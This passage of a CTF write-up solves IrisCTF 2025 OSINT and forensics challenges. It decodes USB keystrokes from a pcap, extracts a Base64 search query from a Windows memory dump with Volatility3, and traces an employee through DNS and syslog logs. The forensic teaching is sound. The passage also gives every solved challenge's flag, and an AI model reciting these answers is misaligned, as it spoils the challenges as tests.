Body, Not much populated areas*, the road in the provided image was surrounded by mountains.\n\nWith these specifications, I started matching the description with the route numbers found earlier:\n\n- I couldn’t find a water body around G7.\n- G6 was heavily populated.\n- G4501 was not deep into the mountains.\n- S216 and S321 were primarily in city regions.\n- Lastly, S3801 had water bodies and very sparsely populated areas around it, which led me to consider it for flag verification.\n\n##### Creating the Flag\nWith the gathered information, let's construct the flag using the defined format.\n\nHooray! It was the correct flag!!!\n\nFlag:\n\n```yaml\nirisctf{S3801_CN}\n```\n\n### Where's Bobby 2\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/osint/wb2/desc.png)\n\nSource File: [files](/images/posts/2025-irisctf/osint/wb2/wheres-bobby-2.tar.gz)\n\nHints released on Discord Announcements:\n![Hints](/images/posts/2025-irisctf/osint/wb2/hints.png)\n\nYoutube Video Link: https://www.youtube.com/watch?v=L9Di-UVC-_4\n\n#### Solution\n\nIf you came directly to this challenge's writeup, I will recommend you first read my `Checking Out Of Winter` writeup because I have made it in detail, specifying some important notes.\n\nProvided Image:\n\n![Wall Art](/images/posts/2025-irisctf/osint/wb2/wheres-bobby-2.jpg)\n\nI did a Reverse Image Search using Google Lens and found these helpful sites:\n```\n- https://ameblo.jp/yorinoto/entry-12733913890.html\n- https://m.sohu.com/a/545522713_99946287/?pvid=000115_3w_a\n```\nAfter exploring these sites, I discovered that the location name is `Bai Zi Wan Subway Station`, and the wall art is `\"Hundred Ziwan Kissho\" / \"The Hundred Children Playing in Baizi Bay\"` painting.\n\n##### The Challenge with Finding the Coordinates\n\nFinding the exact coordinates was tough for non-Chinese users because all locations on Google Maps for China are shifted by a few units. You can learn more about this issue from the provided YouTube video.\n\nAlthough it was mentioned not to use Chinese maps or software, I took a look on the `Baidu Map`.\n\n![Baidu Map](/images/posts/2025-irisctf/osint/wb2/baid_maps.png)\n\nAs shown, the main station and the exit buildings are located at the bottom part of the image.\n\nWhen I checked Google Maps, I got this result:\n\n![Google Map](/images/posts/2025-irisctf/osint/wb2/google_map.png)\n\nThe coordinates were shifted, and submitting them didn’t yield the correct result.\n\nI also tried the English version of Wikipedia, which had the coordinates for the station, but again, they were incorrect. Wikipedia then directed me to Bing Maps:\n\n![Bing Map](/images/posts/2025-irisctf/osint/wb2/bing.png)\n\nHowever, the coordinates from Bing Maps were also inaccurate.\n\n##### Exploring Other Sources\n\nNext, I started searching for documented articles that might include the exact coordinates for the station. I looked at the [Baidu Encyclopedia](https://baike.baidu.com/) site:\n\n![Baidu Encyclo](/images/posts/2025-irisctf/osint/wb2/baidu_encyclo.png)\n\nUnfortunately, it didn’t mention any coordinates.\n\nFinally, after more extensive searching 😵‍💫, I found the Chinese-language version of [Wikipedia](https://zh.wikipedia.org/zh-cn), specifically tailored for Simplified Chinese characters (used in Mainland China and Singapore).\n\n![Wikipedia(CN)](/images/posts/2025-irisctf/osint/wb2/wiki.png)\n\nLink: https://zh.wikipedia.org/zh-cn/%E7%99%BE%E5%AD%90%E6%B9%BE%E7%AB%99_(%E5%9C%B0%E9%93%81)\n\nThis page included the coordinates.\n\n##### Verifying the Coordinates\nI quickly entered the coordinates on Google Maps. Although the result was still shifted from the exact building, I refined the search as shown below:\n\n![Google Maps](/images/posts/2025-irisctf/osint/wb2/correct_coords.png)\n\nCoordinates: 39.891389, 116.491667\n\nI rounded off the coordinates to 3 decimal points: 39.891, 116.492.\n\nAfter submitting these refined coordinates, I confirmed that they were the desired ones for this challenge. 😮‍💨\n\nFlag:\n\n```yaml\nirisctf{39.891_116.492}\n```\n\n*This marks the last challenge based on the files. Thanks to `bobby` for creating this amazing challenge; I really enjoyed it.*\n\n## Forensics\n\n### Deldeldel\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/deldeldel/desc.png)\n\nSource File: [deldeldel.tar.gz](/images/posts/2025-irisctf/forensics/deldeldel/deldeldel.tar.gz)\n\n#### Solution\n\n```bash\n$ file klogger.pcapng \nklogger.pcapng: pcapng capture file - version 1.0\n```\n\nWe received a .pcapng file for this challenge. When I opened it in Wireshark, the packets were exclusively based on the USB protocol.\n\n![USB Protocol Packets](/images/posts/2025-irisctf/forensics/deldeldel/usb_protocol.png)\n\nThe mention of \"keys\" and the file name klogger (key logger) hinted that this was likely a USB Keyboard/Keypad challenge.\n\nUSB Protocol challenges are a standard type in the Forensics category of CTFs and often repeat with slight modifications. The goal is to extract the USB HID data or CAP data available at the bottom of the packets, which contains useful information about the user's activity on the USB device.\n\nSources:\n```\nhttp://www.usb.org/developers/hidpage/ \n\nSee section 10 Keyboard/Keypad Page (0x07) of document USB HID Usage Tables Version 1.12.\n\nDefinition of these 3 bytes can be found in section B.1 Protocol 1 (Keyboard) of document Device Class Definition for HID Version 1.11.\n```\n\nTo analyze the user's activity, we check the flow of USB IN packets (packets sent from the device to the host). These are typically user activities.\n\n##### Filtering the USB IN Packets\nTo narrow down the USB IN packets, I applied the following filter in Wireshark:\n\n`usb.transfer_type == 1 && usb.endpoint_address.direction == 1`\n\n![USB IN Packets](/images/posts/2025-irisctf/forensics/deldeldel/usb_in.png)\n\nHere, we can see source IPs such as 1.3.2, 1.7.1, 1.5.1, and 1.5.2.\n\n##### Extracting USB CAP Data\nThe USB HID data/CAP data is usually 8 bytes. I started by analyzing the packets from 1.3.2, as they had 8-byte CAP data.\n\nTo extract the USB capture data, I used the tshark CLI. \n\n```bash\n$ tshark -r klogger.pcapng -Y \"usb.transfer_type == 1 && usb.endpoint_address.direction == 1 && usb.src==1.3.2\" -T fields -e usb.capdata > data_1.3.2.txt\n```\n##### Parsing USB CAP Data\n\nFor parsing the USB capture data into readable data, I used the following script:\n\n```python\nimport sys\n\n# USB HID Keymap for decoding key codes\nKEY_CODES = {\n    0x04: ['a', 'A'], 0x05: ['b', 'B'], 0x06: ['c', 'C'], 0x07: ['d', 'D'],\n    0x08: ['e', 'E'], 0x09: ['f', 'F'], 0x0A: ['g', 'G'], 0x0B: ['h', 'H'],\n    0x0C: ['i', 'I'], 0x0D: ['j', 'J'], 0x0E: ['k', 'K'], 0x0F: ['l', 'L'],\n    0x10: ['m', 'M'], 0x11: ['n', 'N'], 0x12: ['o', 'O'], 0x13: ['p', 'P'],\n    0x14: ['q', 'Q'], 0x15: ['r', 'R'], 0x16: ['s', 'S'], 0x17: ['t', 'T'],\n    0x18: ['u', 'U'], 0x19: ['v', 'V'], 0x1A: ['w', 'W'], 0x1B: ['x', 'X'],\n    0x1C: ['y', 'Y'], 0x1D: ['z', 'Z'], 0x1E: ['1', '!'], 0x1F: ['2', '@'],\n    0x20: ['3', '#'], 0x21: ['4', '$'], 0x22: ['5', '%'], 0x23: ['6', '^'],\n    0x24: ['7', '&'], 0x25: ['8', '*'], 0x26: ['9', '('], 0x27: ['0', ')'],\n    0x28: ['\\n', '\\n'], 0x2A: ['[BACKSPACE]', '[BACKSPACE]'], 0x2B: ['\\t', '\\t'],\n    0x2C: [' ', ' '], 0x2D: ['-', '_'], 0x2E: ['=', '+'], 0x2F: ['[', '{'],\n    0x30: [']', '}'], 0x33: [';', ':'], 0x34: [\"'\", '\"'], 0x36: [',', '<'],\n    0x37: ['.', '>'], 0x38: ['/', '?'], 0x39: ['[CAPSLOCK]', '[CAPSLOCK]'],\n    0x4F: [u'→', u'→'], 0x50: [u'←', u'←'], 0x51: [u'↓', u'↓'], 0x52: [u'↑', u'↑']\n}\n\ndef decode_keylogger(file):\n    with open(file, 'r') as f:\n        lines = f.read().splitlines()\n\n    decoded_output = \"\"\n    for line in lines:\n        if len(line) != 16:\n            continue\n\n        # Parse the 8-bytes payload\n        modifier = int(line[0:2], 16)\n        key_code = int(line[4:6], 16)\n\n        # Ignore empty key codes\n        if key_code == 0:\n            continue\n\n        # Decode keypress\n        is_shift = (modifier & 0x02) != 0  # Check if Shift is active\n        char = KEY_CODES.get(key_code, [''])[is_shift]  # Select shifted/unshifted char\n\n        if char == '[BACKSPACE]':  # Handle backspace\n            decoded_output = decoded_output[:-1]\n        else:\n            decoded_output += char\n\n    return decoded_output\n\nif __name__ == '__main__':\n    if len(sys.argv) < 2:\n        print('Usage: python3 script.py <data.txt>')\n        sys.exit(1)\n\n    file_path = sys.argv[1]\n    result = decode_keylogger(file_path)\n    print(result)\n```\n\n```bash\n$ python3 usbkeyboard.py data_1.3.2.txt \ngabaacbacaabbbbabbabcbbcccdcdcdcccbccbbcbaaaaaaaaabcabadadcacacbacaaabbbacbacbcbb\n```\nHowever, the data retrieved from 1.3.2 was garbage. I then moved on to another source IP (1.5.1), which also had 8-byte CAP data, and repeated the tshark steps.\n\n```bash\n$ python3 usbkeyboard.py data_1.5.1.txt \nHheey   AAalicce! Ii  tthink  Ii''m  ssupppooseed  too  giivee yoou   tiss fllaag:\n\niriisctfF{[tthis_akeyloggeer_iisS_too_hard_to_use}\n```\n\n##### Creating the Flag\nAfter extracting the data, I cleaned up the received flag and formatted it properly as per the challenge's defined format.\n\nFlag:\n\n```yaml\nirisctf{this_keylogger_is_too_hard_to_use}\n```\n\n### Windy Day\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/wd/desc.png)\n\n#### Solution\n\nWe received a memory dump for this challenge. The title, `Windy Day`, hints towards Windows OS, and the description, `lost track of an important note...`, suggests we may need to retrieve some crucial information from the memory.\n\n##### Initial Analysis\n\nI started analyzing the memory dump using [Volatility3](https://github.com/volatilityfoundation/volatility3).\n\n```bash\n$ python3 vol.py -f memdump.mem windows.info\nVolatility 3 Framework 2.12.0\nProgress:  100.00\t\tPDB scanning finished                        \nVariable\tValue\n\nKernel Base\t0xf80365200000\nDTB\t0x1ab000\nSymbols\tfile:///home/ubuntu/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/D5E3E35C1C2D48E9906F43C7C05FA3F0-1.json.xz\nIs64Bit\tTrue\nIsPAE\tFalse\nlayer_name\t0 WindowsIntel32e\nmemory_layer\t1 FileLayer\nKdVersionBlock\t0xf803654f4df8\nMajor/Minor\t15.14393\nMachineType\t34404\nKeNumberProcessors\t1\nSystemTime\t2025-01-03 17:11:15+00:00\nNtSystemRoot\tC:\\Windows\nNtProductType\tNtProductServer\nNtMajorVersion\t10\nNtMinorVersion\t0\nPE MajorOperatingSystemVersion\t10\nPE MinorOperatingSystemVersion\t0\nPE Machine\t34404\nPE TimeDateStamp\tTue Oct 22 04:58:19 2024\n```\nAs usual, I first listed all the processes. \n\n```bash\n$ python3 vol.py -f memdump.mem windows.pslist\nVolatility 3 Framework 2.12.0\nProgress:  100.00\t\tPDB scanning finished                        \nPID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime\tFile output\n\n4\t0\tSystem\t0xe38cb727f6c0\t98\t-\tN/A\tFalse\t2025-01-03 16:50:11.000000 UTC\tN/A\tDisabled\n.\n.\n3036\t4060\tfirefox.exe\t0xe38cb818b500\t89\t-\t1\tTrue\t2025-01-03 16:55:40.000000 UTC\tN/A\tDisabled\n3968\t3036\tfirefox.exe\t0xe38cb75b9080\t22\t-\t1\tTrue\t2025-01-03 16:55:41.000000 UTC\tN/A\tDisabled\n3624\t3036\tfirefox.exe\t0xe38cbb380080\t5\t-\t1\tTrue\t2025-01-03 16:55:41.000000 UTC\tN/A\tDisabled\n3828\t3036\tfirefox.exe\t0xe38cbb539800\t17\t-\t1\tTrue\t2025-01-03 16:55:43.000000 UTC\tN/A\tDisabled\n2420\t3036\tfirefox.exe\t0xe38cbb711800\t5\t-\t1\tTrue\t2025-01-03 16:55:44.000000 UTC\tN/A\tDisabled\n4076\t3036\tfirefox.exe\t0xe38cbb116080\t17\t-\t1\tTrue\t2025-01-03 16:55:45.000000 UTC\tN/A\tDisabled\n3132\t3036\tfirefox.exe\t0xe38cbb1e1080\t5\t-\t1\tTrue\t2025-01-03 16:55:47.000000 UTC\tN/A\tDisabled\n712\t 628\tApplicationFra 0xe38cbb573080\t1\t-\t1\tFalse\t2025-01-03 16:56:02.000000 UTC\tN/A\tDisabled\n5044\t3036\tfirefox.exe\t0xe38cbb7c8800\t5\t-\t1\tTrue\t2025-01-03 16:56:43.000000 UTC\tN/A\tDisabled\n4772\t3036\tfirefox.exe\t0xe38cbb0d6300\t18\t-\t1\tTrue\t2025-01-03 16:57:38.000000 UTC\tN/A\tDisabled\n1380\t2856\tFTK Imager.exe 0xe38cbb82e800\t20\t-\t1\tFalse\t2025-01-03 17:02:19.000000 UTC\tN/A\tDisabled\n5324\t3036\tfirefox.exe\t0xe38cbba94080\t19\t-\t1\tTrue\t2025-01-03 17:09:52.000000 UTC\tN/A\tDisabled\n5804\t3036\tfirefox.exe\t0xe38cbb261080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n2308\t3036\tfirefox.exe\t0xe38cbbb44080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n2712\t3036\tfirefox.exe\t0xe38cbba16080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n3328\t3036\tfirefox.exe\t0xe38cbb8c6800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n6256\t3036\tfirefox.exe\t0xe38cbb884800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n5288\t3036\tfirefox.exe\t0xe38cbb8a9800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n5664\t3036\tfirefox.exe\t0xe38cbb7c9080\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n5196\t3036\tfirefox.exe\t0xe38cbb8c0800\t19\t-\t1\tTrue\t2025-01-03 17:09:56.000000 UTC\tN/A\tDisabled\n4508\t3036\tfirefox.exe\t0xe38cbbbe8800\t19\t-\t1\tTrue\t2025-01-03 17:09:59.000000 UTC\tN/A\tDisabled\n4344\t3036\tfirefox.exe\t0xe38cbbbb8080\t19\t-\t1\tTrue\t2025-01-03 17:10:00.000000 UTC\tN/A\tDisabled\n928     3036\tfirefox.exe\t0xe38cbbc8c080\t19\t-\t1\tTrue\t2025-01-03 17:10:00.000000 UTC\tN/A\tDisabled\n740\t3036\tfirefox.exe\t0xe38cbb89e400\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n2252\t3036\tfirefox.exe\t0xe38cb7e25080\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n2920\t3036\tfirefox.exe\t0xe38cbbc9e080\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n3124\t3036\tfirefox.exe\t0xe38cbbca0080\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n7116\t3036\tfirefox.exe\t0xe38cb7e32680\t19\t-\t1\tTrue\t2025-01-03 17:10:01.000000 UTC\tN/A\tDisabled\n```\n\nAmong them, I noticed multiple firefox.exe processes running. I decided to dump all the files of the Firefox process with PID 3036:\n\n```bash\n$ python3 vol.py -f memdump.mem windows.dumpfiles --pid 3036\n```\n\nThis command yielded some DLLs and database files such as .db and .sqlite.\n\n```\npermissions.sqlite  favicons.sqlite  cookies.sqlite  places.sqlite  formhistory.sqlite  storage.sqlite  cert9.db  key4.db \ndomain_to_categories.sqlite  protections.sqlite  content-prefs.sqlite  bounce-tracking-protection.sqlite  data.sqlite\n```\n\n##### Exploring the Databases\nI analyzed these database files using DB Browser.\n\nThe places.sqlite and cookies.sqlite files contained search history data. Below is a snapshot of the data from places.sqlite:\n\n![Places.sqlite](/images/posts/2025-irisctf/forensics/wd/places-sqlite.png)\n\nInitially, I suspected that the flag might have been uploaded to a file-sharing site like file.io. I explored the file.io site links but found no useful results.\n\n##### Further Investigation\nNext, I dumped the memory of the firefox.exe process for deeper analysis:\n\n```bash\n$ python3 vol.py -f memdump.mem windows.memmap --pid 3036 --dump\n```\nThis generated a pid.3036.dmp file. I ran strings on this file and noticed several links, which led me to Google Sites.\n\n```bash\n$ strings pid.3036.dmp | grep \"https://www.google.com/search?\"\n{\"1\":{\"0\":\"https://www.google.com/search?client=firefox-b-d&q=ftk+imager+portable\"}}\nhttps://www.google.com/search?client=firefox-b-d&q=ftk+imager+portable ftk imager portable - Google Search\nhttps://www.google.com/search?client=firefox-b-d&q=\nhttps://www.google.com/search?client=firefox-b-d&q=ftk+imager+portable\nhttps://www.google.com/search?client=firefox-b-d&q=\nhttps://www.google.com/search?client=firefox-b-d&q=aXJpc2N0ZntpX2FtX2\n.\n.\nhttps://www.google.com/search?client=firefox-b-d&q=aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0%3D\n.\n```\n\nAmong the search queries, one appeared to be encoded in Base64.\n\n##### Decoding the Base64 String\nI decoded the Base64 string using the following command:\n\n```bash\n$ echo \"aXJpc2N0ZntpX2FtX2FuX2lkaW90X3dpdGhfYmFkX21lbW9yeX0=\" | base64 -d\nirisctf{i_am_an_idiot_with_bad_memory}\n```\n\nBoom! We got our flag!!!\n\nFlag: \n```yaml\nirisctf{i_am_an_idiot_with_bad_memory}\n```\n\n##### Alternate Approach\nLater, I realized the same result could have been achieved by directly running strings with base64 of \"irisctf{\" on the main memdump.mem file, which would have saved some effort. 😛\n\n### Tracem1\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/tracem/desc.png)\n\nSource File: [tracem-1.tar.gz](/images/posts/2025-irisctf/forensics/tracem/tracem-1.tar.gz)\n\n#### Solution\n\nFor this challenge, we need to identify the culprit. We were provided with a logs.json file packed with DHCP, DNS, Active Directory, and syslog logs.\n\n- The DHCP Logs show the assignment of IP addresses.\n- The DNS Logs contain records of IP address resolutions for websites.\n- The Active Directory Logs include the names of the employees within the company.\n- The Syslog Logs are primarily focused on authentication and also contain the names of the employees.\n\nLet's analyze the file:\n\n```json\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:30:39.50\", \"data\": {\"timestamp\": \"2024-12-04 06:30:38.816111\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.49.0.2\", \"src_port\": 53, \"dest_ip\": \"10.49.81.65\", \"dest_port\": 2561, \"transaction_id\": 54938, \"answers\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"dropbox.com\", \"addr\": \"2620:100:6040:18::a27d:f812\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:30:39.69\", \"data\": {\"timestamp\": \"2024-12-04 06:30:38.819396\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.0.2\", \"src_port\": 53, \"dest_ip\": \"10.33.81.223\", \"dest_port\": 10338, \"transaction_id\": 8697, \"answers\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"hr.evil-insurance.corp\", \"addr\": null}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:30:39.40\", \"data\": {\"timestamp\": \"2024-12-04 06:30:38.959049\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.51.247.145\", \"src_port\": 9037, \"dest_ip\": \"10.51.0.2\", \"dest_port\": 53, \"transaction_id\": 689, \"queries\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"gitlab.evil-insurance.corp\"}]}}\n```\nWe can see references to many links accessed by different employees, along with their IP addresses and MAC addresses.\n\nSince the challenge was related to computer networks, I started by checking all the URLs accessed by the employees.\n\n```bash\n$ grep -o '\"name\": *\"[^\"]*\"' logs.json | sed -E 's/\"name\": *\"([^\"]*)\"/\\1/'\n```\n\nSo these were the urls:\n\n```yaml\nconnectivitycheck.gstatic.com\nwww.msftconnecttest.com\ntime.windows.com\n.\nit.evil-insurance.corp\nevil-insurance.corp\nchat.evil-insurance.corp\nservice.evil-insurance.corp\nhr.evil-insurance.corp\ngitlab.evil-insurance.corp\nfiles.evil-insurance.corp\nmeetings.evil-insurance.corp\nguestportal.evil-insurance.corp\nsso.evil-insurance.corp\n.\naftermarket.pl\nbp0.blogger.com\ncopious-amounts-of-illicit-substances-marketplace.com\nbreachforums.st\nsmith-wesson.com\nbmj.com\nthedailybeast.com\nwelt.de\n```\n\nThere were some safe sites, as well as sites related to the evil-insurance (EI) Corp Company.\n\nOut of all the sites, I found the following to be very suspicious:\n\n```yaml\ncopious-amounts-of-illicit-substances-marketplace.com\nbreachforums.st\n```\n\nSince these sites were also matching the keywords mentioned in the description, I proceeded to check who accessed both of these sites.\n\n```bash\n$strings logs.json | grep -E \"copious-amounts-of-illicit-substances-marketplace.com|breachforums.st\"\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:30:18.99\", \"data\": {\"timestamp\": \"2024-12-04 06:30:18.347812\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.18.209\", \"src_port\": 7419, \"dest_ip\": \"10.33.0.2\", \"dest_port\": 53, \"transaction_id\": 45042, \"queries\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"copious-amounts-of-illicit-substances-marketplace.com\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:30:19.21\", \"data\": {\"timestamp\": \"2024-12-04 06:30:18.572830\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.0.2\", \"src_port\": 53, \"dest_ip\": \"10.33.18.209\", \"dest_port\": 7419, \"transaction_id\": 45042, \"answers\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"copious-amounts-of-illicit-substances-marketplace.com\", \"addr\": \"104.16.148.244\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:33:36.80\", \"data\": {\"timestamp\": \"2024-12-04 06:33:36.803488\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.18.209\", \"src_port\": 52836, \"dest_ip\": \"10.33.0.2\", \"dest_port\": 53, \"transaction_id\": 50295, \"queries\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"breachforums.st\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:33:37.18\", \"data\": {\"timestamp\": \"2024-12-04 06:33:37.175597\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.0.2\", \"src_port\": 53, \"dest_ip\": \"10.33.18.209\", \"dest_port\": 52836, \"transaction_id\": 50295, \"answers\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"breachforums.st\", \"addr\": \"185.129.102.136\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:50:51.87\", \"data\": {\"timestamp\": \"2024-12-04 06:50:51.748497\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.18.209\", \"src_port\": 22966, \"dest_ip\": \"10.33.0.2\", \"dest_port\": 53, \"transaction_id\": 33048, \"queries\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"breachforums.st\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 06:50:52.14\", \"data\": {\"timestamp\": \"2024-12-04 06:50:52.021816\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.33.0.2\", \"src_port\": 53, \"dest_ip\": \"10.33.18.209\", \"dest_port\": 22966, \"transaction_id\": 33048, \"answers\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"breachforums.st\", \"addr\": \"185.129.102.136\"}]}}\n```\n\nAs expected, the same IP address (10.33.18.209) accessed both of these sites.\n\nLet's analyze the syslog:\n\n```json\n{\"host\": \"primary\", \"source\": \"udp:514\", \"sourcetype\": \"syslog\", \"_time\": \"2024-12-04 04:58:36.95\", \"data\": {\"_raw\": \"2024-12-04 04:58:35.622504||https://sso.evil-insurance.corp/idp/profile/SAML2/Redirect/SSO|/idp/profile/SAML2/Redirect/SSO|5b52053ac1ab1f4935a3d7d6c6aa4ff0|authn/MFA|10.33.18.209|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3 Edge/16.16299|https://sso.evil-insurance.corp/ns/profiles/saml2/sso/browser|llloyd||uid|service.evil-insurance.corp|https://sso.evil-insurance.corp/idp/sso|url:oasis:names:tc:SAML:2.0:protocol|urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect|urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST|kzYQV+Jk2w3KkwmRjR+HK4QWVQ3qzLPLgA5klV2b8bQT+NLYLeqCZw5xUGKbx1U1158jlnUYRrILtVTtMkMdbA==|urn:oasis:names:tc:SAML:2.0:nameid-format:transient|_60b0fd4b0ed5bba3474faeb85b3944e|2024-12-04 04:58:35.622504|_c4b56d58-625b-49aa-b859-4a2068422979||||urn:oasis:names:tc:SAML:2.0:status:Success|||false|false|true\", \"timestamp\": \"2024-12-04 04:58:35.622504\", \"NLYLeqCZw5xUGKbx1U1158jlnUYRrILtVTtMkMdbA\": \"=|urn:oasis:names:tc:SAML:2.0:nameid-format:transient|_60b0fd4b0ed5bba3474faeb85b3944e|2024-12-04\"}}\n```\n\nI then checked the syslog for this IP address and found the name of the employee associated with it: `llloyd`.\n\n##### Creating the Flag\nWith the gathered information, I constructed the flag using the defined format, and boom, that was the correct flag.\n\nFlag:\n\n```yaml\nirisctf{llloyd}\n```\n\n### Tracem2\n\n#### Challenge Description\n\n![Description](/images/posts/2025-irisctf/forensics/tracem2/desc.png)\n\nSource File: [tracem-2.tar.gz](/images/posts/2025-irisctf/forensics/tracem2/tracem-2.tar.gz)\n\nYeah some of the teams had 600+ and 1300+ attempts.😂\n#### Solution\n\nThis challenge is a continuation of the Tracem1 challenge. For better context, you can refer to my Tracem1 write-up. Unfortunately, I was only able to solve this challenge partially during the CTF duration 🥹. I delved too deeply into analysis and missed a critical clue. However, I’ll share all the data and steps I took while solving it.\n \n##### Challenge Overview\nWe received a logs.json file for this challenge. Similar to Tracem1, I began analyzing the logs.\n\nHere are some notable sites accessed in the logs.json file:\n\n```yaml\ndetectportal.firefox.com\nwww.msftconnecttest.com\n.\n3.fedora.pool.ntp.org\n0.arch.pool.ntp.org\nglobo.com\nreg.ru\n1.ubuntu.pool.ntp.org\npolitico.com\nenable-javascript.com\nmozilla.com\nfb.me\n20minutos.es\nlast.fm\nxda-developers.com\nunicef.org\nnypost.com\ntarget.com\nkickstarter.com\n2.arch.pool.ntp.org\n.\ngitlab.evil-insurance.corp\nhr.evil-insurance.corp\nfiles.evil-insurance.corp\nmeetings.evil-insurance.corp\nit.evil-insurance.corp\nevil-insurance.corp\nchat.evil-insurance.corp\nservice.evil-insurance.corp\nguestportal.evil-insurance.corp\nsso.evil-insurance.corp\nevil-insurance.corp\n.\nubuntu.com\nthepiratebay.org\ngeneric-illicit-activities-hub.org\ndeloitte.com\nbp0.blogger.com\n```\n\nThese two sites seemed suspicious:\n\n- thepiratebay.org\n- generic-illicit-activities-hub.org\n\nI then identified the user who accessed both sites:\n\n```bash\n$ strings logs.json | grep -E \"thepiratebay.org|generic-illicit-activities-hub.org\"\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 08:51:51.12\", \"data\": {\"timestamp\": \"2024-12-04 08:51:51.092921\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.21.121\", \"src_port\": 48851, \"dest_ip\": \"10.18.0.2\", \"dest_port\": 53, \"transaction_id\": 119, \"queries\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"thepiratebay.org\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 08:51:51.13\", \"data\": {\"timestamp\": \"2024-12-04 08:51:51.102210\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.21.121\", \"src_port\": 2975, \"dest_ip\": \"10.18.0.2\", \"dest_port\": 53, \"transaction_id\": 13007, \"queries\": [{\"type\": \"AAAA\", \"class\": \"IN\", \"name\": \"thepiratebay.org\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 08:51:53.22\", \"data\": {\"timestamp\": \"2024-12-04 08:51:52.449001\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.0.2\", \"src_port\": 53, \"dest_ip\": \"10.18.21.121\", \"dest_port\": 48851, \"transaction_id\": 119, \"answers\": [{\"type\": \"A\", \"class\": \"IN\", \"name\": \"thepiratebay.org\", \"addr\": \"104.16.148.244\"}]}}\n{\"host\": \"primary\", \"source\": \"stream:dns\", \"sourcetype\": \"stream:dns\", \"_time\": \"2024-12-04 08:51:53.22\", \"data\": {\"timestamp\": \"2024-12-04 08:51:52.450021\", \"protocol_stack\": \"ip:udp:dns\", \"transport\": \"udp\", \"src_ip\": \"10.18.0.2\", \"src_port\": 53, \"dest_ip\": 